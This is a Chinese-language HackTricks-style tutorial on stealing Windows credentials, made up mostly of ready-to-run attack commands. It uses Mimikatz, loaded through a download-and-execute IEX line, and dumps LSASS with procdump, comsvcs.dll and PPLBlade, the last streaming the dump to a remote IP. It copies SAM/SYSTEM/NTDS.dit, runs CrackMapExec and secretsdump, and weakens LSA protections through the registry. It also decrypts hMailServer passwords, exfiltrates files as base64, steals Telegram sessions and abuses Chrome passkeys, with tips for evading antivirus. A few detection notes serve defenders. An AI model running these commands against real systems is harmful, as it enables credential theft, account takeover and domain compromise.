# 窃取 Windows 凭据

{{#include ../../banners/hacktricks-training.md}}

## 凭据 Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**了解 Mimikatz 还能做什么，请参阅** [**此页面**](credentials-mimikatz.md)**。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**在此了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护措施可能会阻止 Mimikatz 提取某些凭据。**

## Credentials with Meterpreter

使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)，在受害者系统中**搜索密码和哈希值**。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是合法的 Microsoft 工具**，Defender 不会检测到它。\
你可以使用此工具**转储 lsass 进程**、**下载转储文件**，并从转储文件中**在本地提取** **凭据**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将使用 **procdump.exe dump lsass.exe** 检测为**恶意行为**，这是因为它们会检测字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传给 procdump，而**不是**传入 **lsass.exe 这个名称**，会更**隐蔽**。

### 使用 **comsvcs.dll** dump lsass

在 `C:\Windows\System32` 中找到的一个名为 **comsvcs.dll** 的 DLL，负责在进程崩溃时 **dump 进程内存**。此 DLL 包含一个名为 **`MiniDumpW`** 的**函数**，旨在通过 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三个部分。要 dump 的进程 ID 是第一部分，dump 文件的位置是第二部分，第三部分必须是 **full**。没有其他可选项。\
解析这三个部分后，DLL 会创建 dump 文件，并将指定进程的内存写入该文件。\
可以使用 **comsvcs.dll** dump lsass 进程，从而无需上传和执行 procdump。此方法的详细说明见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。<sup>[[9]](#references)</sup>

执行时使用以下命令：

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**自动化此过程。**

### **使用 Task Manager dump lsass**

1. 右键点击任务栏，然后点击 Task Manager
2. 点击 More details
3. 在 Processes 选项卡中找到“Local Security Authority Process”进程
4. 右键点击“Local Security Authority Process”进程，然后点击“Create dump file”。

### 使用 procdump dump lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是由 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。

已有的完整系统 crash dump，或存放在可访问用户文件夹中的压缩副本，可能保留可供离线分析的凭据材料。`MEMORY.DMP` 和 `MEMORY.7z` 等文件名只能作为审查线索：请验证其来源和访问权限，不要假设其中包含可用或当前有效的凭据。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一款受保护进程转储工具，支持对内存转储进行混淆，并将其传输到远程工作站，而不将其写入磁盘。

**主要功能**：

1. 绕过 PPL 保护
2. 混淆内存转储文件，以规避基于 Defender 特征码的检测机制
3. 使用 RAW 和 SMB 上传方式上传内存转储，而不将其写入磁盘（无文件转储）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – 基于 SSP 的 LSASS 转储，无需调用 MiniDumpWriteDump

Ink Dragon 发布了一款名为 **LalsDumper** 的三阶段 dumper，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR hooks 永远不会触发：<sup>[[3]](#references)</sup>

1. **阶段 1 loader（`lals.exe`）** – 在 `fdp.dll` 中搜索由 32 个小写 `d` 字符组成的占位符，将其替换为 `rtu.txt` 的绝对路径，将修改后的 DLL 保存为 `nfdp.dll`，并调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **LSASS 内的阶段 2** – LSASS 加载 `nfdp.dll` 时，该 DLL 会读取 `rtu.txt`，将每个字节与 `0x20` 进行 XOR，然后将解码后的 blob 映射到内存中，再转移执行。
3. **阶段 3 dumper** – 映射后的 payload 使用从哈希 API 名称解析出的 **direct syscalls** 重新实现 MiniDump 逻辑（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。一个名为 `Tom` 的专用 export 会打开 `%TEMP%\<pid>.ddt`，将压缩后的 LSASS dump 写入文件，然后关闭句柄，以便之后进行 exfiltration。

操作说明：

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 放在同一目录中。阶段 1 会将硬编码的占位符改写为 `rtu.txt` 的绝对路径，因此将它们分开会破坏整个流程。
* 注册时会将 `nfdp` 添加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`。你也可以自行预先写入该值，让 LSASS 在每次启动时重新加载该 SSP。
* `%TEMP%\*.ddt` 文件是压缩后的 dump。先在本地解压，然后将其交给 Mimikatz/Volatility 提取凭据。
* 运行 `lals.exe` 需要 admin/SeTcb 权限，以确保 `AddSecurityPackageA` 成功；调用返回后，LSASS 会透明地加载恶意 SSP 并执行阶段 2。
* 从磁盘删除 DLL 不会将其从 LSASS 中卸载。你需要删除注册表项并重启 LSASS（重启系统），否则它会继续用于长期 persistence。

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### 转储 LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump 目标 DC 的 NTDS.dit

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### 从目标 DC Dump NTDS.dit 密码历史记录

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 显示每个 NTDS.dit 帐户的 pwdLastSet 属性

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## 窃取 SAM 和 SYSTEM

这些文件应**位于**_C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM_。但**你不能直接以常规方式复制它们**，因为它们受到保护。

### 从注册表获取

窃取这些文件最简单的方法是从注册表中获取副本：

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**下载**这些文件到你的 Kali 机器上，然后使用以下命令**提取 hashes**：

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### 卷影复制

你可以使用此服务复制受保护的文件。你需要具有管理员权限。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中提供。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

但你也可以通过 **Powershell** 执行相同操作。以下示例展示了**如何复制 SAM 文件**（使用的硬盘是“C:”，文件保存到 C:\users\Public），但你也可以用这种方法复制任何受保护的文件：

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

书中的代码：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory 凭据 - NTDS.dit**

**NTDS.dit** 文件被称为 **Active Directory** 的核心，其中存储着用户对象、组及其成员关系等重要数据。域用户的 **密码哈希** 就存储在该文件中。该文件是 **Extensible Storage Engine (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

该数据库中维护着三个主要表：

- **Data Table**：用于存储用户和组等对象的详细信息。
- **Link Table**：用于跟踪组成员关系等关联。
- **SD Table**：存储每个对象的 **安全描述符**，以确保所存储对象的安全性和访问控制。

Christoffer Andersson 对数据库层的研究详细记录了这些表及其特定版本的行为。<sup>[[8]](#references)</sup>

Windows 使用 _Ntdsa.dll_ 与该文件交互，该文件由 _lsass.exe_ 使用。因此，**NTDS.dit** 文件的**部分**内容可能位于 **`lsass`** 内存中（你可能会找到最近访问的数据，这很可能是为了提升性能而使用了 **缓存**）。

#### 解密 NTDS.dit 中的哈希

哈希经过三次加密：

1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥 (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密 **哈希**。
3. 使用 **DES** 解密 **哈希**。

**PEK** 在每个域控制器上都**具有相同的值**，但它会使用该域控制器的 **SYSTEM** hive 中特定于该 DC 的 **BOOTKEY** 加密后存储在 **NTDS.dit** 中。因此，提取凭据需要同时获取 **NTDS.dit** 和 **SYSTEM** (`C:\Windows\System32\config\SYSTEM`)。

### 使用 Ntdsutil 复制 NTDS.dit

从 Windows Server 2008 开始提供。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

你也可以使用 [**卷影复制**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM 文件**（同样可以[**从注册表中转储，或使用卷影复制**](#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 中提取哈希**

获取 **NTDS.dit** 和 **SYSTEM** 文件后，你可以使用 _secretsdump.py_ 等工具来**提取哈希**：

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

你也可以使用有效的域管理员用户**自动提取它们**：

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

对于**较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 提取。

最后，你也可以使用 **metasploit 模块**：_post/windows/gather/credentials/domain_hashdump_，或使用 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库中。提取的不仅有机密，还包括完整对象及其属性，以便在获取原始 NTDS.dit 文件后进一步提取信息。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive 是可选的，但可用于解密 secrets（NT 和 LM hashes、补充凭据，例如明文密码、Kerberos 或 trust keys、NT 和 LM 密码历史记录）。此外，还会提取以下信息：用户和机器账户及其 hashes、UAC flags、上次登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组及递归成员关系、组织单位树及其成员关系、受信任域及其 trust 类型、方向和属性……

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。你可以使用此二进制文件从多种软件中提取凭据。

```
lazagne.exe all
```

## 从 SAM 和 LSASS 提取凭据的其他工具

### Windows credentials Editor (WCE)

此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭据

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

从 SAM 文件中提取凭据

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

从这里下载：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)，然后**执行它**，即可提取密码。

## 挖掘空闲的 RDP 会话并弱化安全控制

Ink Dragon 的 FinalDraft RAT 包含一个 `DumpRDPHistory` tasker，其技术对任何 red-teamer 都很有用：<sup>[[3]](#references)</sup>

### DumpRDPHistory 风格的遥测收集

* **出站 RDP 目标** – 解析 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` 下的每个用户配置单元。每个子项都会存储服务器名称、`UsernameHint` 和最后写入时间戳。你可以使用 PowerShell 复现 FinalDraft 的逻辑：

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **入站 RDP 证据** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中的 Event ID **21**（成功登录）和 **25**（断开连接），以确定谁管理了这台机器：

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

一旦确认哪个 Domain Admin 会定期连接，就在其**断开连接**的会话仍然存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM 回退会将其验证器和令牌留在 LSASS 中，随后可通过 SMB/WinRM 重放这些凭据，以获取 `NTDS.dit` 或在域控制器上植入持久化机制。

### FinalDraft 针对的注册表降级

该植入程序还会篡改多个注册表项，以便更轻松地窃取凭据：<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* 设置 `DisableRestrictedAdmin=1` 会在 RDP 期间强制完整复用凭据/票据，从而支持类似 pass-the-hash 的横向跳转。
* `LocalAccountTokenFilterPolicy=1` 会禁用 UAC 令牌筛选，使本地管理员通过网络获得不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 处于联机状态时登录，为攻击者提供另一个内置的高权限帐户。
* `RunAsPPL=0` 会移除 LSASS PPL 保护，使 LalsDumper 等转储工具可以轻易访问内存。

## hMailServer 配置凭据（入侵后）

根据安装布局，检查确切的配置文件 `C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 和 `C:\ProgramData\hMailServer\hMailServer.ini`。可读取且非空的 `[Security] AdministratorPassword=` 值是 hMailServer 管理员密码哈希；它并不能证明这是 Windows Administrator 密码。如果恢复了该凭据，任何向 Windows 帐户的横向跳转都需要独立验证密码复用情况和登录权限。

对于使用 SQL CE 数据库的安装，INI 中独立的 `[Database] Password=` 值用于保护数据库。在旧版安装中，该值使用静态密钥 `THIS_KEY_IS_NOT_SECRET` 和 4 字节字节序交换进行 Blowfish 加密。使用 INI 中的十六进制字符串运行以下 Python 代码片段：<sup>[[2]](#references)</sup>

首先确认当前帐户可以读取 INI 和对应的 SQL CE `.sdf` 数据库。INI 密码用于保护数据库；它与数据库中存储的邮箱帐户哈希是分开的。检查或升级正在使用的数据库时，只能操作其**副本**，切勿操作正在使用的文件。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

使用明文密码复制 SQL CE 数据库以避免文件锁定，加载 32 位 provider，并在查询哈希前按需升级：

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列使用 hMailServer 哈希格式（hashcat 模式 `1421`）。只有当被破解的邮箱密码也被本地/域账户使用，且该账户具有所需的远程登录权限时，才能将其用作 Windows 用户的跳板。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一些工具通过拦截 LSA 登录回调 `LsaApLogonUserEx2` 来捕获**明文登录密码**。其原理是 hook 或封装身份验证包回调，从而在凭据被哈希之前、**登录期间**捕获凭据，然后将其写入磁盘或返回给操作者。这通常通过一个注入 LSA 或向 LSA 注册的辅助程序实现，并记录每次成功的交互式/网络登录事件，包括用户名、域和密码。<sup>[[1]](#references)</sup>

操作说明：
- 需要本地管理员/SYSTEM 权限，才能在身份验证路径中加载辅助程序。
- 只有在发生登录时才会捕获凭据（具体取决于 hook 的位置，可能是交互式、RDP、服务或网络登录）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) 会将已保存的连接信息存储在每个用户各自的 `sqlstudio.bin` 文件中。专用的 dump 工具可以解析该文件并恢复已保存的 SQL 凭据。在只能返回命令输出的 shell 中，通常会将文件编码为 Base64 并输出到 stdout，以便将其外传。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

在操作端重新构建该文件，并在本地运行 dumper 以恢复凭据：

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## 通过 Chrome DevTools Protocol 窃取浏览器会话和 cookie

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## 窃取 Telegram Desktop `tdata` 会话

Telegram Desktop 将授权和账户状态保存在 **`tdata`** 目录中。只要授权仍然有效，兼容的工具就可以加载复制的会话，无需账户密码即可进行身份验证；如果启用了本地数据加密，窃取者还需要知道密码。随后，已通过身份验证的会话可能会暴露身份数据、对话和成员资格元数据、消息以及可下载的媒体文件。<sup>[[10]](#references)</sup>

### 发现和获取

同时搜索已安装和便携式布局；Microsoft Store 的包名称可能各不相同，因此请枚举包含 `TelegramMessenge` 的包目录，并检查其 `LocalCache\Roaming` 子目录。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

如果普通读取失败，且进程令牌**已经包含并启用了** `SeBackupPrivilege`，则可将支持备份的访问方式作为后备方案；它不会获取该特权，也不会提升进程权限。使用 `FILE_FLAG_BACKUP_SEMANTICS` 调用 `CreateFileW`，可以请求备份/还原语义，并在令牌具备所需特权时绕过文件安全检查，但仅靠此标志无法绕过不兼容的共享锁。<sup>[[10]](#references)[[11]](#references)</sup>

对于正在使用且被锁定的文件，可创建/读取 **Volume Shadow Copy**；对于被 ACL 阻止访问的文件，`robocopy /B` 会使用备份模式并绕过文件和目录 ACL。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

具有带宽意识的 implant 可能会先提交文件路径清单，收到快照标识符以及 C2 已存储的路径后，只上传缺失的文件。因此，在递归枚举 `tdata` 后进行的小规模增量传输，仍可能意味着会话窃取成功。<sup>[[10]](#references)</sup>

### 检测与遏制

将非 Telegram 进程对 `tdata` 的递归访问，与启用 `SeBackupPrivilege`、以备份语义打开文件、VSS 活动，或使用 `/B` 参数的子进程 `robocopy.exe` 关联起来进行检测。同时，排查快速枚举 `%APPDATA%` 和 `%LOCALAPPDATA%\Packages`，随后同一进程发起出站连接的行为。遭到入侵后，使用 **Settings → Devices**（或 **Privacy & Security → Active Sessions**）终止不认识的会话；仅启用两步验证不会撤销已被窃取的授权。<sup>[[10]](#references)[[13]](#references)</sup>

## 从 Windows 上的 Chrome 窃取 Passkeys / WebAuthn 凭据

如果在使用 **Chrome + Google Password Manager 同步 Passkeys** 的 Windows 主机上，以**受害者用户**身份获得代码执行权限，那么即使**没有管理员/SYSTEM 权限**，Passkeys 也会成为一个值得关注的 post-exploitation 目标。<sup>[[4]](#references)</sup>

### 有价值的本地痕迹

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** 存储以 protobuf 编码的 **`WebauthnCredentialSpecifics`** 记录。同一用户下的进程可以枚举同步通行密钥的 **RP ID**、**用户名**、**凭据 ID** 和加密私钥材料。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** 存储本地设备注册状态，例如 **`wrapped_identity_private_key`**，以及用于恢复同步凭据的封装密钥。<sup>[[4]](#references)</sup>

快速排查：

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM 绑定的密钥 blob 仍可被滥用为本地签名预言机

如果浏览器将 TPM 支持的身份密钥导出为 **`NCRYPT_OPAQUE_KEY_BLOB`**，并将该 blob 存储在用户可访问的状态中，恶意软件就**不需要**提取原始私钥。它只需在**同一台机器**上重新导入该 blob，然后让本地 TPM 对攻击者控制的数据进行签名：<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

这意味着，**硬件绑定可防止凭据导出到设备外，但无法阻止同一用户在已被入侵的终端上使用凭据**。

### 实际滥用路径

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - 从 Chrome 的 LevelDB 中枚举 `WebauthnCredentialSpecifics`。
   - 发起 passkey 登录并获取新的 WebAuthn challenge。
   - 在受害者的 TPM 上使用窃取的 `wrapped_identity_private_key` blob，对 cloud-authenticator 请求绑定进行签名。
   - 将返回的 assertion 中继给 relying party。
   - 如果 RP 接受 `userVerification=preferred`，或未拒绝 **`UV=0`** 的 assertion，这种方式尤其有价值。
2. **待处理 UV-key 劫持**<sup>[[4]](#references)</sup>
   - 删除 `passkey_enclave_state` 或发送有效签名的 `device/forget` 操作，强制重新 onboard。
   - 如果 onboard 后设备处于 **`uv_key_pending`** 状态，则注册攻击者控制的 UV 公钥。
   - 如果提供商未验证新 UV key 的 attestation / secure-hardware origin，则之后由攻击者的 key 生成的签名会被视为 **`UV=1`**。
3. **Master-secret / SDS 恢复窃取**<sup>[[4]](#references)</sup>
   - 强制执行恢复或重新加入流程，使 Chrome 获取同步 passkey 的 master secret。
   - 监视 `passkey_enclave_state` 的重新创建/修改，然后在明文 **security domain secret (SDS)** 驻留于内存时转储 Chrome 内存。
   - 使用恢复的 SDS 解密每条 `WebauthnCredentialSpecifics` 记录中的加密字段，并恢复可移植的 WebAuthn 私钥。

### DFIR / 检测思路

- 监控 `passkey_enclave_state` 的**删除/重新创建**。<sup>[[4]](#references)</sup>
- 对非浏览器进程异常访问 Chrome **`Sync Data\LevelDB`** 发出告警。
- 对 **Chrome 内存转储**或可疑的跨进程内存访问发出告警。
- 调查反复出现的 **Google Password Manager recovery PIN** 提示或意外的重新 onboard。
- 请注意，同步 passkey 的 WebAuthn **`signCount`** 通常用处不大，因为它可能保持不变，因此传统的克隆检测能力较弱。

## References

- [1] [Unit 42 – 一项针对高价值领域、持续多年且未被发现的行动调查](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo：通过 SMTP 进行 Word VBA 宏钓鱼 → hMailServer 凭据解密 → 利用 Veeam CVE-2023-27532 获取 SYSTEM 权限](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – 揭秘 Ink Dragon：揭示隐蔽攻击行动的中继网络与内部运作](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey：无密码身份验证中的新型攻击面](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG 密钥存储](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows：Microsoft 系统与网络攻击](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory 数据存储的实际工作原理：深入了解 NTDS.dit（第 1 部分）](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - 远程转储 LSASS 密码](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho 借助 Still 工具包扩充其网络间谍工具库](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW 函数与 `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` 备份模式](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – 终止活动会话](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
